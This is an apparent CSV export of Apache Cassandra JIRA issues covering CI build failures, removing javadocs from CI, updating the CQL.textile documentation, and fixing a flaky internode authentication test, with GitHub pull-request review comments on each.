   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=dcb4768345e0fe96420c4f4597e2eb822040d15a
   affected paths:
* src/java/org/apache/cassandra/tools/nodetool/ClientStats.java
* test/unit/org/apache/cassandra/tools/nodetool/ClientStatsTest.java
* CHANGES.txt
* NEWS.txt

   Build Result: UNSTABLE
   Passing Tests: 47334
   Failing Tests: 19

||Test|Failures|JIRA||
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-compression|5 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteStreamFailure|2 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSegmentFlaggingWithNonblockingOnCreation|5 of 76|[CASSANDRA-17542?|https://issues.apache.org/jira/browse/CASSANDRA-17542]|
|org.apache.cassandra.cql3.validation.operations.SelectTest.testTokenFctRejectsInvalidColumnType|4 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteBeforeRangeMovement|7 of 76|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnComplexPrimaryKey|8 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testRangeQuery|5 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect|5 of 76|[CASSANDRA-16677?|https://issues.apache.org/jira/browse/CASSANDRA-16677]|
|org.apache.cassandra.distributed.upgrade.CompactStorageImplicitNullInClusteringTest.testImplicitNullInClusteringWithCompactStorage|4 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.DropCompactStorageTest.testDropCompactStorage|1 of 76|[CASSANDRA-17674?|https://issues.apache.org/jira/browse/CASSANDRA-17674]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|15 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn|6 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_current_3_0_x_To_indev_4_1_x.test_bootstrap_multidc|3 of 76|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*TestUpgrade*""]
|org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest.testPagingWithCompactStorage|6 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|8 of 76|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.distributed.test.CASTest.testSuccessfulWriteDuringRangeMovementFollowedByConflicting|8 of 76|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|org.apache.cassandra.cql3.ViewFilteringClustering1Test.terminated successfully|4 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.CompactStorageHiddenColumnTest.testHiddenColumnWithCompactStorage|5 of 76|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove javadocs step from CI and release process,CASSANDRA-17712,13460051,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,bereng,bereng,23/Jun/22 05:16,05/Oct/22 22:22,13/Jul/23 08:40,18/Aug/22 11:01,3.0.28,3.11.14,4.0.6,4.1,4.1-beta1,,CI,,,,0,,"Currently the javadocs step is both:
- Taking up jenkins cycles and generating a [large output|https://ci-cassandra.apache.org/job/Cassandra-trunk-artifacts/1313/jdk=jdk_1.8_latest,label=cassandra/consoleFull] in CI when building artifacts
- Failing randomly on javadoc issues such as {{AlterTableStatement.java:135: error: text not allowed in element}}

Apidocs are not being bundled, uploaded or used anywhere. Hence it would be best to remove javadocs generation on every CI. Mainly removing javadoc from artifacts and mvn-install.",,bereng,brandon.williams,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17713,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Degradation -> Resource Management,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Aug 18 11:01:14 UTC 2022,,,,,,,All,,,,"0|z14xao:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/9e32c44455f5df1749b66cc66c5a3c18929b7bd2,,,,,,,,,run CI,,,,,"10/Aug/22 18:14;brandon.williams;This is happening quite frequently on at least one architecture/jvm combination which silently exacerbates our build times with retries.  Spending over 30 minutes just to build artifacts is fairly painful.;;;","16/Aug/22 18:31;brandon.williams;||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17712-3.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/575/workflows/c448c0af-31aa-4951-8ba3-10f33e95115f]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17712-3.11]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/577/workflows/b9d9f03c-a311-4503-a6a7-583aab71b8ac]|
|[4.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17712-4.0]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/578/workflows/005be4dd-992e-44eb-a138-a1e8714855a6]|
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17712-4.1]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/579/workflows/263ce121-e6d2-4423-9fd4-a26cf074ebee]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17712-trunk]|[circle|https://app.circleci.com/pipelines/github/driftx/cassandra/576/workflows/a71dbed3-bd3c-439a-8a70-5e035135edf5]|
;;;","16/Aug/22 20:32;smiklosovic;Great idea, tired of hitting the same issue all over again, I do not know why it is flaky. Sometimes it passes, sometimes it does not. ""the right thing"" is to fix all Javadocs so they are nice and clean but that is gargantuan task at this stage.;;;","17/Aug/22 05:29;bereng;Ci needs to be against jenkins right? Started them [here|https://ci-cassandra.apache.org/view/all/job/Cassandra-devbranch/1878/] and the following ones;;;","17/Aug/22 10:33;brandon.williams;We don't ship the jars and I doublechecked that in the builds, so it shouldn't make a difference but it certainly won't hurt! Thanks.;;;","17/Aug/22 11:44;bereng;Given how many times we've been hit by packaging, which only gets exercised in jenkins, seems worth it to me.;;;","18/Aug/22 05:02;bereng;+1. No more javadocs are built. 2 runs are red but iiuc on some artifacts copy error which I've seen before and I think it's unrelated.;;;","18/Aug/22 11:01;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CQL.textile needs to be made current,CASSANDRA-17709,13458535,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,blerer,brandon.williams,brandon.williams,22/Jun/22 11:18,05/Oct/22 22:22,13/Jul/23 08:40,28/Sep/22 14:07,3.11.14,4.0.7,4.1,4.1-beta1,,,Legacy/CQL,,,,0,,"Per CASSANDRA-17570 https://github.com/apache/cassandra/blob/trunk/doc/cql3/CQL.textile is outdated, and the document we ship inside packages, so this should be made current.",,bereng,blerer,mck,,,,,,,,,,,,"blerer opened a new pull request, #1885:
URL: https://github.com/apache/cassandra/pull/1885

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;27/Sep/22 12:36;githubbot;600","blerer opened a new pull request, #1886:
URL: https://github.com/apache/cassandra/pull/1886

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;27/Sep/22 12:38;githubbot;600","blerer opened a new pull request, #1887:
URL: https://github.com/apache/cassandra/pull/1887

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;27/Sep/22 12:39;githubbot;600","driftx commented on code in PR #1885:
URL: https://github.com/apache/cassandra/pull/1885#discussion_r981223365


##########
doc/cql3/CQL.textile:
##########
@@ -1825,6 +1827,44 @@ They can also be input as string literals in any of the following formats:
 * @08:12:54.123456@
 * @08:12:54.123456789@
 
+h3(#usingdurations). Working with durations
+
+Values of the @duration@ type are encoded as 3 signed integer of variable lengths. The first integer represents the

Review Comment:
   integer -> integers



##########
doc/cql3/CQL.textile:
##########
@@ -1752,6 +1753,7 @@ p. The following table gives additional informations on the native data types, a
 |@date@     |   integers, strings  |A date (with no corresponding time value).  See ""Working with dates"":#usingdates below for more information.|
 |@decimal@  |   integers, floats   |Variable-precision decimal|
 |@double@   |   integers           |64-bit IEEE-754 floating point|
+|@duration@ |  duration           |  A duration with nanosecond precision. See ""Working with durations"":#usingdurations below for details.|

Review Comment:
   spacing looks off-by-one



;27/Sep/22 13:35;githubbot;600","driftx commented on code in PR #1886:
URL: https://github.com/apache/cassandra/pull/1886#discussion_r981235663


##########
doc/cql3/CQL.textile:
##########
@@ -2110,7 +2112,25 @@ will select all rows where the @timeuuid@ column @t@ is strictly older than '201
 
 _Warning_: We called the values generated by @minTimeuuid@ and @maxTimeuuid@ _fake_ UUID because they do no respect the Time-Based UUID generation process specified by the ""RFC 4122"":http://www.ietf.org/rfc/rfc4122.txt. In particular, the value returned by these 2 methods will not be unique. This means you should only use those methods for querying (as in the example above). Inserting the result of those methods is almost certainly _a bad idea_.
 
-h3(#timeFun). Time conversion functions
+
+h3(#datetimeFun). Datetime functions
+
+h4(#curentDateTime). Retrieving the current date/time
+
+The following functions can be used to retrieve the date/time at the time where the function is invoked:
+
+|_. function name         |_.    output type        |
+| @currentTimestamp@    |  @timestamp@          |
+| @currentDate@          |  @date@                |
+| @currentTime@          |  @time@                |
+| @currentTimeUUID@     |  @timeUUID@            |

Review Comment:
   Spacing



##########
doc/cql3/CQL.textile:
##########
@@ -1984,6 +1984,47 @@ UPDATE plays SET scores = scores - [ 12, 21 ] WHERE id = '123-afde'; // removes
 
 As with ""maps"":#map, TTLs if used only apply to the newly inserted/updated _values_.
 
+h2(#arithmeticOperators). Arithmetic Operators
+
+h3(#numberArithmetic). Number Arithmetic
+
+CQL supports the following operators:
+
+|_. Operator   |_. Description                        |
+| @-@ (unary)  | Negates operand                      |
+| @+@          | Addition                             |
+| @-@          | Substraction                         |
+| @*@          | Multiplication                       |
+| @/@          | Division                             |
+| @%@          | Returns the remainder of a division  |
+
+Arithmetic operations are only supported on numeric types or counters.
+
+The return type of the operation will be based on the operand types:
+
+
+|_. left/right     |_. @tinyint@    |_. @smallint@    |_. @int@      |_. @bigint@    |_. @counter@    |_. @float@     |_. @double@    |_. @varint@    |_. @decimal@    |

Review Comment:
   formatting



##########
doc/cql3/CQL.textile:
##########
@@ -1748,6 +1749,7 @@ p. The following table gives additional informations on the native data types, a
 |@date@     |   integers, strings  |A date (with no corresponding time value).  See ""Working with dates"":#usingdates below for more information.|
 |@decimal@  |   integers, floats   |Variable-precision decimal|
 |@double@   |   integers           |64-bit IEEE-754 floating point|
+|@duration@ |  duration           |  A duration with nanosecond precision. See ""Working with durations"":#usingdurations below for details.|

Review Comment:
   spacing



##########
doc/cql3/CQL.textile:
##########
@@ -1,4 +1,4 @@
-<!--
+!--

Review Comment:
   Probably still need this :)



##########
doc/cql3/CQL.textile:
##########
@@ -1997,7 +2038,7 @@ The following table describes the conversions supported by the @cast@ function.
 
 |_. from    |_. to   |
 |@ascii@   |@text@, @varchar@                                                                                    |
-|@bigint@   |@tinyint@, @smallint@, @int@, @float@, @double@, @decimal@, @varint@, @text@, @varchar@             |
+|@bigint@   |@tinyint@, @smallint@, @int@, @float@, @double@, @@decimal@@, @varint@, @text@, @varchar@             |

Review Comment:
   spacing is off-by-one



##########
doc/cql3/CQL.textile:
##########
@@ -1821,6 +1823,44 @@ They can also be input as string literals in any of the following formats:
 * @08:12:54.123456@
 * @08:12:54.123456789@
 
+h3(#usingdurations). Working with durations
+
+Values of the @duration@ type are encoded as 3 signed integer of variable lengths. The first integer represents the

Review Comment:
   integer -> integers



;27/Sep/22 13:36;githubbot;600","driftx commented on code in PR #1887:
URL: https://github.com/apache/cassandra/pull/1887#discussion_r981245224


##########
doc/cql3/CQL.textile:
##########
@@ -2154,6 +2154,16 @@ A number of functions are provided to ""convert"" a @timeuuid@, a @timestamp@ or a
 |@dateOf@            |@timeuuid@      |Similar to @toTimestamp(timeuuid)@ (DEPRECATED)|
 |@unixTimestampOf@   |@timeuuid@      |Similar to @toUnixTimestamp(timeuuid)@ (DEPRECATED)|
 
+h4(#floorFun). Floor function
+
+Rounds date and time to the nearest value.
+
+|_. type |_. function |_. |
+|@timestamp@  | floor(timestamp, duration [, start_timestamp]) | If the start_timestamp is not used, then the start timestamp is January 1, 1970 00:00:00.000 GMT |
+|@timeuuid@  | floor(timeuuid, duration [, start_timestamp]) | If the start_timestamp is not used, then the start timestamp is January 1, 1970 00:00:00.000 GMT |
+|@date@  | floor(date, duration [, start_date]) | If the start_date is not used, then the start date is January 1, 1970 GMT |
+|@time@  | floor(time, duration [, start_time]) | ==If the start_time is not used, then the start time is 00:00:00[000000000]== |
+

Review Comment:
   Formatting



##########
doc/cql3/CQL.textile:
##########
@@ -1822,6 +1824,44 @@ They can also be input as string literals in any of the following formats:
 * @08:12:54.123456@
 * @08:12:54.123456789@
 
+h3(#usingdurations). Working with durations
+
+Values of the @duration@ type are encoded as 3 signed integer of variable lengths. The first integer represents the

Review Comment:
   integer -> integers



##########
doc/cql3/CQL.textile:
##########
@@ -1,4 +1,4 @@
-<!--
+!--

Review Comment:
   Need this :)



##########
doc/cql3/CQL.textile:
##########
@@ -1749,6 +1750,7 @@ p. The following table gives additional informations on the native data types, a
 |@date@     |   integers, strings  |A date (with no corresponding time value).  See ""Working with dates"":#usingdates below for more information.|
 |@decimal@  |   integers, floats   |Variable-precision decimal|
 |@double@   |   integers           |64-bit IEEE-754 floating point|
+|@duration@ |  duration           |  A duration with nanosecond precision. See ""Working with durations"":#usingdurations below for details.|

Review Comment:
   missing a space



##########
doc/cql3/CQL.textile:
##########
@@ -2111,7 +2113,25 @@ will select all rows where the @timeuuid@ column @t@ is strictly older than '201
 
 _Warning_: We called the values generated by @minTimeuuid@ and @maxTimeuuid@ _fake_ UUID because they do no respect the Time-Based UUID generation process specified by the ""RFC 4122"":http://www.ietf.org/rfc/rfc4122.txt. In particular, the value returned by these 2 methods will not be unique. This means you should only use those methods for querying (as in the example above). Inserting the result of those methods is almost certainly _a bad idea_.
 
-h3(#timeFun). Time conversion functions
+
+h3(#datetimeFun). Datetime functions
+
+h4(#curentDateTime). Retrieving the current date/time
+
+The following functions can be used to retrieve the date/time at the time where the function is invoked:
+
+|_. function name         |_.    output type        |
+| @currentTimestamp@    |  @timestamp@          |

Review Comment:
   Formatting



##########
doc/cql3/CQL.textile:
##########
@@ -1998,7 +2039,7 @@ The following table describes the conversions supported by the @cast@ function.
 
 |_. from    |_. to   |
 |@ascii@   |@text@, @varchar@                                                                                    |
-|@bigint@   |@tinyint@, @smallint@, @int@, @float@, @double@, @decimal@, @varint@, @text@, @varchar@             |
+|@bigint@   |@tinyint@, @smallint@, @int@, @float@, @double@, @@decimal@@, @varint@, @text@, @varchar@             |

Review Comment:
   spacing



##########
doc/cql3/CQL.textile:
##########
@@ -1985,6 +1985,47 @@ UPDATE plays SET scores = scores - [ 12, 21 ] WHERE id = '123-afde'; // removes
 
 As with ""maps"":#map, TTLs if used only apply to the newly inserted/updated _values_.
 
+h2(#arithmeticOperators). Arithmetic Operators
+
+h3(#numberArithmetic). Number Arithmetic
+
+CQL supports the following operators:
+
+|_. Operator   |_. Description                        |
+| @-@ (unary)  | Negates operand                      |
+| @+@          | Addition                             |
+| @-@          | Substraction                         |
+| @*@          | Multiplication                       |
+| @/@          | Division                             |
+| @%@          | Returns the remainder of a division  |
+
+Arithmetic operations are only supported on numeric types or counters.
+
+The return type of the operation will be based on the operand types:
+
+
+|_. left/right     |_. @tinyint@    |_. @smallint@    |_. @int@      |_. @bigint@    |_. @counter@    |_. @float@     |_. @double@    |_. @varint@    |_. @decimal@    |

Review Comment:
   Spacing



;27/Sep/22 13:36;githubbot;600","blerer closed pull request #1885: CASSANDRA-17709 (3.11): Make CQL.textile up to date
URL: https://github.com/apache/cassandra/pull/1885


;28/Sep/22 14:30;githubbot;600","blerer closed pull request #1886: CASSANDRA-17709 (4.0): Make CQL.textile up to date
URL: https://github.com/apache/cassandra/pull/1886


;28/Sep/22 14:30;githubbot;600","blerer closed pull request #1887: CASSANDRA-17709 (4.1): Make CQL.textile up to date
URL: https://github.com/apache/cassandra/pull/1887


;28/Sep/22 14:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,blerer,,,,,,,,,,,,,,Documentation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 28 14:07:16 UTC 2022,,,,,,,All,,,,"0|z14ny0:",9223372036854775807,,,,brandon.williams,,,,Normal,,3.11.0,,https://github.com/apache/cassandra/commit/0894fd97a2df87dd833272c5db16fb3238e11012,,,,,,,,,Doc change,,,,,"23/Jun/22 07:42;bereng;Mmmm in CASSANDRA-13047 we agreed to remove the textile file (see description). But in CASSANDRA-16763 it was agreed later on to keep it.

Also it is mentioned [here|https://issues.apache.org/jira/browse/CASSANDRA-17570?focusedCommentId=17556918&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17556918] there are plans to generate the docs in tree:

- Wouldn't it be better to remove the textile file and go for the in-tree docs directly, otherwise it's wasted effort?
- I don't think this should be a 4.1 blocker as it's an existing bug sort to speak?;;;","23/Jun/22 10:10;brandon.williams;bq. Wouldn't it be better to remove the textile file and go for the in-tree docs

This makes the most sense to me, but I'm not sure that can be completed in time for release, so we may need a contingency plan.

bq. I don't think this should be a 4.1 blocker as it's an existing bug sort to speak?

I can see that point, but at the same time I strongly dislike the idea of shipping a new major with ancient documentation.  I think I'd rather not ship any docs (at least you won't get steered in the wrong direction and can look online) if we need more time.;;;","23/Jun/22 10:43;bereng;^ok so you want to address it bc you see this severe enough. Ok got it thx.;;;","12/Jul/22 06:28;bereng;Noting here there has been offline discussion on generating and including the the docs in tree at release time as a one off until it can be properly fixed.;;;","14/Jul/22 15:20;brandon.williams;If we don't get there before release, I've got a branch [here|https://github.com/driftx/cassandra/tree/CASSANDRA-17709] to remove the docs from the Debian package.  I don't believe we ship these in the Redhat packaging.;;;","08/Aug/22 13:43;bereng;This is in progress but who is the assignee please? Thx;;;","08/Aug/22 14:18;brandon.williams;I think someone just clicked 'start progress' on a small flurry of tickets.;;;","09/Aug/22 08:37;bereng;[~mck] I have vague recollections of some effort to be able to generate the docs in tree. Is that ready or where can I get up to date on this to start pulling the thread? Then we can decide if want to pursue that on the release date or what to do here now. Thx in advance;;;","09/Aug/22 10:20;mck;bq.  I have vague recollections of some effort to be able to generate the docs in tree

That would be CASSANDRA-17260 and CASSANDRA-17375, any updates there [~anthonygrasso]? ;;;","10/Aug/22 07:46;mck;Does this ticket need to block a 4.1-beta1 release? (Can we bump the fixVersion back to 4.1-rc ?);;;","10/Aug/22 07:58;bereng;That is exactly what I was leading to. Benjamin took it so I'll defer to him but I'd go RC as well.;;;","10/Aug/22 10:19;brandon.williams;I don't think this needs to block beta, rc is fine.;;;","27/Sep/22 12:40;blerer;||Branch||
|[3.11|https://github.com/apache/cassandra/pull/1885]|
|[4.0|https://github.com/apache/cassandra/pull/1886]|
|[4.1|https://github.com/apache/cassandra/pull/1887]|;;;","27/Sep/22 13:37;brandon.williams;+1 from me, there are some minor formatting fixes for which I left comments.;;;","28/Sep/22 14:04;blerer;Thanks for the review [~brandon.williams] ;;;","28/Sep/22 14:07;blerer;Committed into 3.11 at 0894fd97a2df87dd833272c5db16fb3238e11012 and merged into 4.0, 4.1 and trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky testOutboundConnectionsAreRejectedWhenAuthFails,CASSANDRA-17708,13454660,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,Jyothsnakonisa,e.dimitrova,e.dimitrova,21/Jun/22 22:56,20/Feb/23 19:39,13/Jul/23 08:40,18/Feb/23 01:39,5.0,,,,,,CI,,,,0,,"testOutboundConnectionsAreRejectedWhenAuthFails was introduced in CASSANDRA-17661

It seems it was introduced flaky from the very beginning as per this run in a loop - [https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=flaky-testOutboundConnectionsAreRejectedWhenAuthFails&filter=all]

CC [~janaki.manchala] , [~jonmeredith],  [~ycai] 

 ",,bereng,dchenbecker,e.dimitrova,jonmeredith,Jyothsnakonisa,maedhroz,yifanc,,,,,,,,"yifan-c commented on code in PR #1706:
URL: https://github.com/apache/cassandra/pull/1706#discussion_r1110196443


##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -103,16 +100,12 @@ public void testOutboundConnectionsAreRejectedWhenAuthFails() throws IOException
             executorService.submit(() -> openConnections(cluster));
 
             /*
-             * instance (1) should not connect to instance (2) as authentication fails;
-             * instance (2) should not connect to instance (1) as authentication fails.
+             * Instance (1) should not be able to make outbound connections to instance (2) but Instance (2) should be
+             * accepting outbound connections from Instance (1)

Review Comment:
   The comment is confusing to me.. 
   If instance 1 can never make outbound connections, how can instance 2 expect connections _from_ instance 1? Do you mean instance 2 can make outbound connections _to_ instance 1?



##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -134,19 +125,14 @@ public void testOutboundConnectionsAreRejectedWhenAuthFails() throws IOException
     public void testOutboundConnectionsAreInterruptedWhenAuthFails() throws IOException, TimeoutException
     {
         Cluster.Builder builder = createCluster(AllowFirstAndRejectOtherOutboundAuthenticator.class);
+        final ExecutorService executorService = Executors.newSingleThreadExecutor();
+
         try (Cluster cluster = builder.start())

Review Comment:
   nit: it is safer to close the `ExecutorService` along with `cluster`. Otherwise, if the body of `try` throws, only `cluster` is closed, but `executorService.shutdown()` will not be called. 
   
   You can have multiple `closable`s in the try-with-resources statement, and remove `executorService.shutdown()` at the end of the test.
   ```
   try (Cluster cluster = builder.start(); AutoCloseable es = executorService::shutdown)
   ```



##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -86,8 +84,7 @@ public void testInboundConnectionsAreRejectedWhenAuthFails() throws IOException,
             // Wait for authentication to fail
             cluster.get(1).logs().watchFor(""Unable to authenticate peer"");
             cluster.get(1).runOnInstance(runnable);
-            cluster.get(2).logs().watchFor(""Unable to authenticate peer"");
-            cluster.get(2).runOnInstance(runnable);

Review Comment:
   nit: how about adding a watch for ""Connection reset by peer"" in instances 2's log?
   
   ```
               cluster.get(2).logs().watchFor(""Connection reset by peer"");
   ```



;17/Feb/23 18:56;githubbot;600","yifan-c commented on code in PR #1706:
URL: https://github.com/apache/cassandra/pull/1706#discussion_r1110216521


##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -134,19 +125,14 @@ public void testOutboundConnectionsAreRejectedWhenAuthFails() throws IOException
     public void testOutboundConnectionsAreInterruptedWhenAuthFails() throws IOException, TimeoutException
     {
         Cluster.Builder builder = createCluster(AllowFirstAndRejectOtherOutboundAuthenticator.class);
+        final ExecutorService executorService = Executors.newSingleThreadExecutor();
+
         try (Cluster cluster = builder.start())

Review Comment:
   nit: it is safer to close the `ExecutorService` along with `cluster`. Otherwise, if the body of `try` throws, only `cluster` is closed, but `executorService.shutdown()` will not be called. 
   
   You can have multiple `closable`s in the try-with-resources statement, and remove `executorService.shutdown()` at the end of the test.
   ```
   try (Cluster cluster = builder.start(); Closeable es = executorService::shutdown)
   ```



;17/Feb/23 18:58;githubbot;600","jyothsnakonisa commented on code in PR #1706:
URL: https://github.com/apache/cassandra/pull/1706#discussion_r1110224116


##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -86,8 +84,7 @@ public void testInboundConnectionsAreRejectedWhenAuthFails() throws IOException,
             // Wait for authentication to fail
             cluster.get(1).logs().watchFor(""Unable to authenticate peer"");
             cluster.get(1).runOnInstance(runnable);
-            cluster.get(2).logs().watchFor(""Unable to authenticate peer"");
-            cluster.get(2).runOnInstance(runnable);

Review Comment:
   I think we should watch for ""Unable to authenticate peer"" which is more specific in terms of why the connection reset happen. Also it is the log that we print after `authenticate` call fails.



;17/Feb/23 19:02;githubbot;600","jyothsnakonisa commented on code in PR #1706:
URL: https://github.com/apache/cassandra/pull/1706#discussion_r1110227651


##########
test/distributed/org/apache/cassandra/distributed/test/InternodeEncryptionEnforcementTest.java:
##########
@@ -103,16 +100,12 @@ public void testOutboundConnectionsAreRejectedWhenAuthFails() throws IOException
